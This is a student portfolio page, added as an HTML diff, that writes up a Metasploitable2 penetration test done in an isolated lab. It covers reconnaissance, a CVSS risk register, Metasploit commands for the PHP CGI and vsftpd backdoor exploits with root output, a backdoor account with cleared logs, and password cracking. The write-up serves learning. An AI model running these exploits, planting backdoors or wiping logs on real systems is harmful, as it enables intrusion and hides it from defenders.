@@ -1,0 +1,611 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Metasploitable2 Vulnerability Assessment &amp; Exploitation | Hadis Pazhand</title>
+    <meta name="description" content="Full penetration testing case study against Metasploitable2: reconnaissance, CVSS risk prioritisation, multi-vector exploitation, persistence, and password cracking." />
+    <link rel="icon" href="favicon.svg" type="image/svg+xml" />
+    <link rel="stylesheet" href="style.css" />
+    <style>
+      /* ===== Case Study report styling ===== */
+      .cs-hero {
+        padding: 50px 0 30px;
+        border-bottom: 1px solid rgba(255, 182, 193, 0.25);
+        margin-bottom: 40px;
+      }
+      .cs-back {
+        display: inline-block;
+        color: #ffb6c1;
+        font-size: 0.85rem;
+        margin-bottom: 18px;
+      }
+      .cs-back:hover { color: #ff69b4; }
+      .cs-eyebrow {
+        text-transform: uppercase;
+        letter-spacing: 2px;
+        font-size: 0.75rem;
+        color: #ff69b4;
+        font-weight: 600;
+        margin-bottom: 12px;
+      }
+      .cs-hero h1 {
+        font-family: "Pacifico", cursive;
+        color: #ff69b4;
+        font-size: clamp(1.8rem, 4vw, 2.6rem);
+        line-height: 1.25;
+        margin-bottom: 14px;
+        font-weight: 400;
+      }
+      .cs-hero-sub {
+        max-width: 680px;
+        color: #ddd;
+        font-size: 1.05rem;
+        margin-bottom: 24px !important;
+      }
+      .cs-meta {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 24px;
+        font-size: 0.85rem;
+        color: #ffb6c1;
+      }
+      .cs-meta strong { color: #fff; display: block; font-size: 0.9rem; margin-bottom: 2px;}
+
+      /* Stats row reused from stats-strip but tighter */
+      .cs-stats {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 16px;
+        margin: 30px 0 50px;
+      }
+      .cs-stats .stat-item {
+        background: #111;
+        border: 1px solid rgba(255,182,193,0.35);
+        border-radius: 12px;
+        padding: 16px 10px;
+      }
+
+      /* Phase / section structure */
+      .cs-phase {
+        display: flex;
+        gap: 28px;
+        margin-bottom: 56px;
+        position: relative;
+      }
+      .cs-phase-num {
+        flex: 0 0 60px;
+        font-family: "Pacifico", cursive;
+        font-size: 2rem;
+        color: rgba(255, 105, 180, 0.35);
+        line-height: 1;
+      }
+      .cs-phase-content { flex: 1; min-width: 0; }
+      .cs-phase-content h2 {
+        color: #ff69b4;
+        font-size: 1.4rem;
+        margin-bottom: 6px;
+        font-weight: 600;
+      }
+      .cs-phase-tag {
+        display: inline-block;
+        font-size: 0.7rem;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        color: #ffb6c1;
+        border: 1px solid rgba(255,182,193,0.4);
+        padding: 2px 10px;
+        border-radius: 20px;
+        margin-bottom: 14px;
+      }
+      .cs-phase p { color: #e6e6e6; margin-bottom: 14px; }
+      .cs-phase ul { margin: 0 0 16px 20px; color: #e6e6e6; }
+      .cs-phase li { margin-bottom: 6px; }
+      .cs-phase code {
+        background: #000;
+        color: #ffb6c1;
+        padding: 2px 6px;
+        border-radius: 4px;
+        font-size: 0.88em;
+      }
+
+      /* Timeline connector line */
+      .cs-phase:not(:last-child)::before {
+        content: "";
+        position: absolute;
+        left: 29px;
+        top: 45px;
+        bottom: -56px;
+        width: 1px;
+        background: linear-gradient(to bottom, rgba(255,105,180,0.4), rgba(255,105,180,0.05));
+      }
+
+      /* Command block */
+      .cmd-block {
+        background: #0d0d0d;
+        border: 1px solid rgba(255, 182, 193, 0.25);
+        border-left: 3px solid #ff69b4;
+        border-radius: 6px;
+        padding: 14px 16px;
+        font-family: "Courier New", monospace;
+        font-size: 0.85rem;
+        color: #ffb6c1;
+        overflow-x: auto;
+        margin: 14px 0;
+        white-space: pre;
+      }
+
+      /* Terminal frame for screenshots */
+      .term-frame {
+        background: #0d0d0d;
+        border: 1px solid rgba(255, 182, 193, 0.25);
+        border-radius: 10px;
+        overflow: hidden;
+        margin: 18px 0;
+        box-shadow: 0 8px 20px rgba(0,0,0,0.35);
+      }
+      .term-bar {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        background: #151515;
+        padding: 8px 12px;
+        border-bottom: 1px solid rgba(255,182,193,0.15);
+      }
+      .term-bar .dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+      .dot.red { background: #ff5f56; }
+      .dot.yellow { background: #ffbd2e; }
+      .dot.green { background: #27c93f; }
+      .term-title {
+        margin-left: 8px;
+        font-size: 0.72rem;
+        color: #999;
+        font-family: "Courier New", monospace;
+      }
+      .term-frame img { width: 100%; display: block; }
+      .term-frame figcaption {
+        font-size: 0.78rem;
+        color: #ffb6c1;
+        padding: 10px 14px;
+        border-top: 1px solid rgba(255,182,193,0.12);
+        font-style: italic;
+      }
+      .term-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 18px;
+      }
+      @media (max-width: 700px) {
+        .term-grid { grid-template-columns: 1fr; }
+        .cs-phase { gap: 16px; }
+        .cs-phase-num { flex-basis: 40px; font-size: 1.4rem; }
+        .cs-phase::before { left: 19px; }
+      }
+
+      /* Risk table */
+      .risk-table-wrap { overflow-x: auto; margin: 16px 0 24px; }
+      table.risk-table {
+        width: 100%;
+        border-collapse: collapse;
+        font-size: 0.85rem;
+        min-width: 640px;
+      }
+      table.risk-table th {
+        text-align: left;
+        background: #111;
+        color: #ff69b4;
+        padding: 10px 12px;
+        border-bottom: 2px solid rgba(255,105,180,0.4);
+      }
+      table.risk-table td {
+        padding: 10px 12px;
+        border-bottom: 1px solid rgba(255,182,193,0.15);
+        color: #e6e6e6;
+      }
+      .cvss-badge {
+        display: inline-block;
+        padding: 2px 10px;
+        border-radius: 20px;
+        font-weight: 700;
+        font-size: 0.8rem;
+      }
+      .cvss-critical { background: rgba(255,0,60,0.15); color: #ff4d6d; }
+      .cvss-high { background: rgba(255,159,28,0.15); color: #ff9f1c; }
+
+      /* Kill chain */
+      .kill-chain {
+        list-style: none;
+        margin: 16px 0;
+        padding: 0;
+        counter-reset: chain;
+      }
+      .kill-chain li {
+        counter-increment: chain;
+        position: relative;
+        padding: 8px 0 8px 34px;
+        color: #e6e6e6;
+        border-left: 2px solid rgba(255,105,180,0.3);
+        margin-left: 10px;
+      }
+      .kill-chain li::before {
+        content: counter(chain);
+        position: absolute;
+        left: -13px;
+        top: 6px;
+        width: 22px;
+        height: 22px;
+        background: #ff69b4;
+        color: #111;
+        font-size: 0.75rem;
+        font-weight: 700;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .kill-chain li:last-child { border-left: 2px solid transparent; }
+
+      /* Findings grid */
+      .findings-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+        gap: 16px;
+        margin: 18px 0 10px;
+      }
+      .finding-card {
+        background: #111;
+        border: 1px solid rgba(255,182,193,0.25);
+        border-radius: 10px;
+        padding: 16px;
+      }
+      .finding-card h4 { color: #ff69b4; font-size: 0.95rem; margin-bottom: 6px; }
+      .finding-card p { color: #ccc; font-size: 0.85rem; margin: 0; }
+
+      /* Tools table */
+      table.tools-table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 0.9rem; }
+      table.tools-table td { padding: 8px 10px; border-bottom: 1px solid rgba(255,182,193,0.12); color: #e6e6e6; }
+      table.tools-table td:first-child { color: #ffb6c1; font-weight: 600; white-space: nowrap; }
+
+      .cs-disclaimer {
+        margin-top: 40px;
+        padding: 16px 20px;
+        border-left: 3px solid #ffb6c1;
+        background: rgba(255,182,193,0.05);
+        font-size: 0.85rem;
+        color: #ccc;
+        font-style: italic;
+      }
+
+      .cs-cta {
+        text-align: center;
+        margin: 50px 0 30px;
+      }
+    </style>
+  </head>
+  <body>
+    <header class="site-header">
+      <div class="container header-inner">
+        <div class="brand">
+          <h1>Hadis Pazhand</h1>
+          <p class="subtitle">Cybersecurity Student &amp; IT Enthusiast</p>
+        </div>
+        <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">
+          <span></span><span></span><span></span>
+        </button>
+        <nav class="nav" id="siteNav">
+          <a href="index.html" class="nav-link">Home</a>
+          <a href="about.html" class="nav-link">About</a>
+          <a href="projects.html" class="nav-link active">Projects</a>
+          <a href="contact.html" class="nav-link">Contact</a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="container">
+      <section class="cs-hero">
+        <a href="projects.html" class="cs-back">&larr; Back to Projects</a>
+        <p class="cs-eyebrow">Penetration Testing Case Study</p>
+        <h1>Metasploitable2: Vulnerability Assessment &amp; Exploitation</h1>
+        <p class="cs-hero-sub">
+          A full offensive security lifecycle against an intentionally vulnerable
+          Linux target — reconnaissance, CVSS-based risk prioritisation, multi-vector
+          exploitation, persistence, and password cracking, run entirely in an
+          isolated virtual lab.
+        </p>
+        <div class="cs-meta">
+          <div><strong>Target</strong>Metasploitable2 (10.0.2.3)</div>
+          <div><strong>Attacker Machine</strong>Kali Linux</div>
+          <div><strong>Environment</strong>Isolated virtual lab</div>
+          <div><strong>Course</strong>Bachelor of Cybersecurity, La Trobe University</div>
+        </div>
+      </section>
+
+      <section class="cs-stats">
+        <div class="stat-item">
+          <span class="stat-number">8+</span>
+          <span class="stat-label">Critical/High CVEs Identified</span>
+        </div>
+        <div class="stat-item">
+          <span class="stat-number">2</span>
+          <span class="stat-label">Independent Root-Level Exploit Paths</span>
+        </div>
+        <div class="stat-item">
+          <span class="stat-number">10.0</span>
+          <span class="stat-label">Highest CVSS Score (VSFTPD &amp; Samba)</span>
+        </div>
+        <div class="stat-item">
+          <span class="stat-number">6</span>
+          <span class="stat-label">Phases: Recon → Credential Recovery</span>
+        </div>
+      </section>
+
+      <!-- PHASE 1 -->
+      <div class="cs-phase">
+        <div class="cs-phase-num">01</div>
+        <div class="cs-phase-content">
+          <span class="cs-phase-tag">Reconnaissance</span>
+          <h2>Service Enumeration with Nmap</h2>
+          <p>
+            A full Nmap port scan mapped the target's complete attack surface before
+            any exploitation was attempted. The scan revealed an unusually large
+            attack surface for a single host — legacy, end-of-life services with
+            well-documented public exploits, several of which required no
+            authentication at all.
+          </p>
+          <ul>
+            <li>Open ports: FTP (21), SSH (22), Telnet (23), SMTP (25), DNS (53), HTTP/Apache 2.2.8 (80)</li>
+            <li>Additional ports: Samba (139/445), bindshell (1524), MySQL (3306), distccd (3632), VNC (5900), UnrealIRCd (6667), Apache Tomcat (8180)</li>
+            <li>OS fingerprint confirmed: Linux 2.6.9–2.6.33, Samba 3.0.20-Debian</li>
+          </ul>
+          <div class="term-grid">
+            <figure class="term-frame">
+              <div class="term-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">kali@kali: ~</span></div>
+              <img src="assets/metasploitable2/fig1a-nmap-scan.png" alt="Nmap scan showing open ports including FTP, SSH, Telnet, SMTP, DNS and HTTP" loading="lazy" />
+              <figcaption>Fig 1a — Initial Nmap scan: FTP, SSH, Telnet, SMTP, DNS, HTTP/Apache 2.2.8</figcaption>
+            </figure>
+            <figure class="term-frame">
+              <div class="term-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">kali@kali: ~</span></div>
+              <img src="assets/metasploitable2/fig1c-os-fingerprint.png" alt="OS fingerprinting output confirming Linux 2.6.9 to 2.6.33 running Samba 3.0.20-Debian" loading="lazy" />
+              <figcaption>Fig 1c — OS fingerprinting confirming Samba 3.0.20-Debian</figcaption>
+            </figure>
+          </div>
+        </div>
+      </div>
+
+      <!-- PHASE 2 -->
+      <div class="cs-phase">
+        <div class="cs-phase-num">02</div>
+        <div class="cs-phase-content">
+          <span class="cs-phase-tag">Web App Scanning</span>
+          <h2>Nikto Against DVWA</h2>
+          <p>
+            Nikto was used to assess the web services on port 80 and enumerate the
+            DVWA (Damn Vulnerable Web Application) instance hosted on the target.
+            Scanning uncovered layered misconfigurations on top of the already
+            vulnerable network services.
+          </p>
+          <ul>
+            <li>Security misconfiguration: HTTP TRACE enabled, <code>phpinfo.php</code> exposed</li>
+            <li>Broken access control: directory indexing on <code>/dvwa/config/</code></li>
+            <li>Cryptographic failures: SSLv2 enabled, cookies missing the HttpOnly flag</li>
+            <li>Confirmed CVE-2012-1823 (PHP RCE) and CVE-2014-3704 (SQL injection)</li>
+          </ul>
+          <figure class="term-frame">
+            <div class="term-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">kali@kali: ~</span></div>
+            <img src="assets/metasploitable2/fig3-nikto-dvwa.png" alt="Nikto scan output against DVWA confirming PHP remote code execution and SQL injection vulnerabilities" loading="lazy" />
+            <figcaption>Fig 3 — Nikto scan against DVWA confirming CVE-2012-1823 &amp; CVE-2014-3704</figcaption>
+          </figure>
+        </div>
+      </div>
+
+      <!-- PHASE 3 -->
+      <div class="cs-phase">
+        <div class="cs-phase-num">03</div>
+        <div class="cs-phase-content">
+          <span class="cs-phase-tag">Risk Prioritisation</span>
+          <h2>CVSS Scoring &amp; Risk Register</h2>
+          <p>
+            Every service identified during recon was cross-referenced against known
+            CVEs and scored by CVSS severity and public exploit availability to
+            decide which vulnerabilities to pursue first.
+          </p>
+          <div class="risk-table-wrap">
+            <table class="risk-table">
+              <thead>
+                <tr><th>Service</th><th>Port</th><th>CVE ID</th><th>Description</th><th>CVSS</th><th>Public Exploit</th></tr>
+              </thead>
+              <tbody>
+                <tr><td>vsftpd 2.3.4</td><td>21</td><td>CVE-2011-2523</td><td>Backdoor command execution</td><td><span class="cvss-badge cvss-critical">10.0</span></td><td>Yes — Metasploit</td></tr>
+                <tr><td>Samba 3.0.20</td><td>445</td><td>CVE-2007-2447</td><td>Remote command execution</td><td><span class="cvss-badge cvss-critical">10.0</span></td><td>Yes — Metasploit</td></tr>
+                <tr><td>Apache 2.2.8</td><td>80</td><td>CVE-2017-7679</td><td>Buffer overflow</td><td><span class="cvss-badge cvss-critical">9.8</span></td><td>Yes — Exploit-DB</td></tr>
+                <tr><td>distccd</td><td>3632</td><td>CVE-2004-2687</td><td>Remote command execution</td><td><span class="cvss-badge cvss-critical">9.3</span></td><td>Yes — Metasploit</td></tr>
+                <tr><td>UnrealIRCd</td><td>6667</td><td>CVE-2010-2075</td><td>Backdoor command execution</td><td><span class="cvss-badge cvss-high">7.5</span></td><td>Yes — Metasploit</td></tr>
+                <tr><td>PHP 5.2.4</td><td>80</td><td>CVE-2012-1823</td><td>Remote code execution</td><td><span class="cvss-badge cvss-high">7.5</span></td><td>Yes — Exploit-DB</td></tr>
+                <tr><td>OpenSSH 4.7p1</td><td>22</td><td>CVE-2008-0166</td><td>Weak key generation</td><td><span class="cvss-badge cvss-high">7.8</span></td><td>Yes — Exploit-DB</td></tr>
+                <tr><td>MySQL 5.0.51a</td><td>3306</td><td>CVE-2008-0226</td><td>Remote code execution</td><td><span class="cvss-badge cvss-high">7.5</span></td><td>Yes — Exploit-DB</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p><strong style="color:#ff69b4;">Overall risk posture:</strong> very poor — the environment runs multiple end-of-life services with public exploits, default credentials, and no meaningful access controls.</p>
+          <p>The vsftpd 2.3.4 backdoor and the Samba 3.0.20 vulnerability both allow <em>unauthenticated</em> remote code execution via a single Metasploit module. These flaws chain into a full compromise path:</p>
+          <ol class="kill-chain">
+            <li>Gain initial access via the vsftpd 2.3.4 backdoor on port 21</li>
+            <li>Enumerate the system to identify further services</li>
+            <li>Access phpMyAdmin using default credentials to extract database contents</li>
+            <li>Escalate to root using the distccd vulnerability</li>
+            <li>Establish persistence via the root bindshell already listening on port 1524</li>
+          </ol>
+          <p style="color:#ffb6c1; font-size:0.9rem;">Notably, port 1524 has a root shell listening by default — full compromise is achievable simply by connecting to it, without exploiting a single CVE.</p>
+        </div>
+      </div>
+
+      <!-- PHASE 4 -->
+      <div class="cs-phase">
+        <div class="cs-phase-num">04</div>
+        <div class="cs-phase-content">
+          <span class="cs-phase-tag">Exploitation</span>
+          <h2>Two Independent Root-Level Exploit Paths</h2>
+          <p><strong style="color:#fff;">Method 1 — PHP CGI Argument Injection:</strong> the <code>php_cgi_arg_injection</code> exploit was used to gain a Meterpreter session on the target.</p>
+          <div class="cmd-block">use exploit/multi/http/php_cgi_arg_injection
+set RHOSTS 10.0.2.3
+run
+
+[*] Meterpreter session 1 opened (10.0.2.15:4444 -&gt; 10.0.2.3:55144)</div>
+          <figure class="term-frame">
+            <div class="term-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">kali@kali: ~</span></div>
+            <img src="assets/metasploitable2/fig6-meterpreter-session.png" alt="Metasploit console showing a Meterpreter session successfully opened on the target" loading="lazy" />
+            <figcaption>Fig 6 — PHP CGI argument injection opens a Meterpreter session on 10.0.2.3</figcaption>
+          </figure>
+
+          <p><strong style="color:#fff;">Method 2 — VSFTPD 2.3.4 Backdoor:</strong> exploited independently to obtain root, confirming the finding wasn't a fluke of one code path.</p>
+          <div class="cmd-block">use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.0.2.3
+run
+
+whoami
+root
+id
+uid=0(root) gid=0(root)</div>
+          <figure class="term-frame">
+            <div class="term-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">kali@kali: ~</span></div>
+            <img src="assets/metasploitable2/fig7-vsftpd-root.png" alt="Terminal confirming root access via the vsftpd backdoor, whoami returns root" loading="lazy" />
+            <figcaption>Fig 7 — vsftpd 2.3.4 backdoor confirms root access (uid=0(root) gid=0(root))</figcaption>
+          </figure>
+        </div>
+      </div>
+
+      <!-- PHASE 5 -->
+      <div class="cs-phase">
+        <div class="cs-phase-num">05</div>
+        <div class="cs-phase-content">
+          <span class="cs-phase-tag">Persistence</span>
+          <h2>Backdoor Account &amp; Log Evidence Clearing</h2>
+          <p>
+            With root access confirmed, a backdoor account was created and log
+            evidence was cleared to demonstrate a full post-exploitation
+            persistence workflow — then verified independently with a live SSH
+            login from the Kali attack machine.
+          </p>
+          <div class="term-grid">
+            <figure class="term-frame">
+              <div class="term-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">kali@kali: ~</span></div>
+              <img src="assets/metasploitable2/fig8-backdoor-created.png" alt="Terminal showing a backdoor user account being created via useradd and log files cleared" loading="lazy" />
+              <figcaption>Fig 8 — Backdoor account created via useradd, auth.log &amp; syslog cleared</figcaption>
+            </figure>
+            <figure class="term-frame">
+              <div class="term-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">backdoor@metasploitable: ~</span></div>
+              <img src="assets/metasploitable2/fig9-ssh-login.png" alt="Successful SSH login to Metasploitable2 as the backdoor user" loading="lazy" />
+              <figcaption>Fig 9 — Successful SSH login as the backdoor user from Kali</figcaption>
+            </figure>
+          </div>
+          <figure class="term-frame">
+            <div class="term-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">backdoor@metasploitable: ~</span></div>
+            <img src="assets/metasploitable2/fig10-testfile-transfer.png" alt="A test file successfully transferred and confirmed in the backdoor user's home directory" loading="lazy" />
+            <figcaption>Fig 10 — File transfer confirmed in the backdoor user's home directory, proving durable access</figcaption>
+          </figure>
+        </div>
+      </div>
+
+      <!-- PHASE 6 -->
+      <div class="cs-phase">
+        <div class="cs-phase-num">06</div>
+        <div class="cs-phase-content">
+          <span class="cs-phase-tag">Credential Recovery</span>
+          <h2>Password Cracking with Ophcrack &amp; CrackStation</h2>
+          <p>
+            SAM file hashes recovered from the target were loaded into Ophcrack and
+            cross-checked against CrackStation to recover plaintext credentials —
+            demonstrating the final link in the attacker lifecycle: turning
+            recovered hashes into usable, reusable passwords.
+          </p>
+          <div class="term-grid">
+            <figure class="term-frame">
+              <div class="term-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">ophcrack</span></div>
+              <img src="assets/metasploitable2/fig11-ophcrack.png" alt="Ophcrack loaded with Administrator and John SAM file hashes" loading="lazy" />
+              <figcaption>Fig 11 — Ophcrack loaded with recovered SAM hashes</figcaption>
+            </figure>
+            <figure class="term-frame">
+              <div class="term-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">crackstation.net</span></div>
+              <img src="assets/metasploitable2/fig12-crackstation.png" alt="CrackStation successfully cracking both NTLM hashes" loading="lazy" />
+              <figcaption>Fig 12 — CrackStation cracks both NTLM hashes via precomputed lookup tables</figcaption>
+            </figure>
+          </div>
+        </div>
+      </div>
+
+      <!-- KEY FINDINGS -->
+      <section>
+        <h2 style="color:#ff69b4; font-size:1.4rem; margin-bottom: 16px;">Key Findings</h2>
+        <div class="findings-grid">
+          <div class="finding-card">
+            <h4>8+ Vulnerabilities</h4>
+            <p>Identified across network and web services, all with public exploits available.</p>
+          </div>
+          <div class="finding-card">
+            <h4>Two Root Paths</h4>
+            <p>Root-level compromise achieved through two independent exploitation paths (PHP CGI injection and vsftpd backdoor).</p>
+          </div>
+          <div class="finding-card">
+            <h4>Verified Persistence</h4>
+            <p>Persistent access established via a backdoor user account and confirmed with a live SSH login.</p>
+          </div>
+          <div class="finding-card">
+            <h4>Credentials Recovered</h4>
+            <p>Both recovered NTLM password hashes cracked using Ophcrack and CrackStation.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOLS -->
+      <section style="margin-top: 40px;">
+        <h2 style="color:#ff69b4; font-size:1.4rem; margin-bottom: 16px;">Tools &amp; Technologies</h2>
+        <table class="tools-table">
+          <tbody>
+            <tr><td>Kali Linux</td><td>Attacker machine</td></tr>
+            <tr><td>Nmap</td><td>Network reconnaissance and service enumeration</td></tr>
+            <tr><td>Nikto</td><td>Web application vulnerability scanning</td></tr>
+            <tr><td>Metasploit</td><td>Exploitation framework (vsftpd backdoor, PHP CGI injection)</td></tr>
+            <tr><td>Meterpreter</td><td>Post-exploitation shell and session management</td></tr>
+            <tr><td>Ophcrack</td><td>Rainbow-table based password cracking</td></tr>
+            <tr><td>CrackStation</td><td>Online hash lookup / password recovery</td></tr>
+            <tr><td>DVWA</td><td>Vulnerable web application (SQL injection, RCE testing)</td></tr>
+          </tbody>
+        </table>
+      </section>
+
+      <p class="cs-disclaimer">
+        Conducted entirely in an isolated virtual lab environment on personal
+        hardware, completed as part of a penetration testing subject during a
+        Bachelor of Cybersecurity at La Trobe University. No external systems were
+        targeted.
+      </p>
+
+      <div class="cs-cta">
+        <a href="Metasploitable2_Vulnerability_Assessment.pdf" target="_blank" class="btn">Download Full PDF Report</a>
+        <a href="projects.html" class="btn btn-outline">Back to All Projects</a>
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <div class="container">
+        <p>© 2025 Hadis Pazhand</p>
+        <div class="social-links">
+          <a href="https://github.com/HadisPazhand" target="_blank">GitHub</a> |
+          <a href="https://www.linkedin.com/in/hadis-pazhand-5264311b1/" target="_blank">LinkedIn</a> |
+          <a href="https://www.instagram.com" target="_blank">Instagram</a>
+        </div>
+      </div>
+    </footer>
+
+    <script>
+      const navToggle = document.getElementById('navToggle');
+      const siteNav = document.getElementById('siteNav');
+      if (navToggle && siteNav) {
+        navToggle.addEventListener('click', () => {
+          const isOpen = siteNav.classList.toggle('nav-open');
+          navToggle.setAttribute('aria-expanded', isOpen);
+        });
+      }
+    </script>
+  </body>
+</html>
